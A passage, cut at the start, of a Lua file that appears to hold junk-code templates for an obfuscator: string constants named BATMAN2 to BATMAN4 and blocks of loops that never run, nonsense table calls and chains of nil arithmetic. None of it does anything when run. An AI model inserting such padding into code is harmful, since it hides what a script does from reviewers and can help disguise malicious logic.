while(nil)do;_ = _[_];_ = _(_);_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);local o = {};_ = _(_);_ = _[_];_ = _(_);_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);local _o_ = {};_ = _[_];_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);local po = {};_ = _(_)_ = _[_];_ = _(_);if o._o_ ~= _[nil] then;_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);_ = _[_];_ = _(_);_ = _[_];o.po = o._o_();_ = _(_);o._o_ = _[nil];o.po = _[nil];end;o = _[nil];po = _[nil];_o_ = _[nil];end
if(nil)then  x=_ while x do return end end whysexisgood=_ if(nil)then if(true)then else goto x end ::x:: if(nil)then  x=_ while x do return end end end
]=]

BATMAN4=[[
for i = 1,0 do S = 'Blocker[Spam](Spam2)'if ({}).N~=nil then ({}).N=({}).N() end i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i}  i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i}  i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i}  i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i}  i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i}  i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i}  i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i}  i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i} i = {i , i} i = _ENV[35] i = _ENV[i] i = {i , i}  for i=({}).i ,({}).i ,({}).i do goto s goto s goto s goto s ::s::end for i= {}, ({}).i , {} do goto s goto s goto s goto s::s::end for i= {}, {} , iiii do goto s goto s goto s goto s::s::end for i=({}).i ,({}).i ,({}).i do goto s goto s goto s goto s ::s::end for i= {}, ({}).i , {} do goto s goto s goto s goto s::s::end for i= {}, {} , iiii do goto s goto s goto s goto s::s::end for i=({}).i ,({}).i ,({}).i do goto s goto s goto s goto s ::s::end for i= {}, ({}).i , {} do goto s goto s goto s goto s::s::end for i= {}, {} , iiii do goto s goto s goto s goto s::s::end end

for i = 1, 0 do i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} i = false i = {i, i} i =  _ENV[35] i =  _ENV[i] i = {i, i} end
]]

BATMAN3=[[

while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
function _()
while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;while(nil) do batmin = "batmin" end;
end

]]

BATMAN2=[[
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
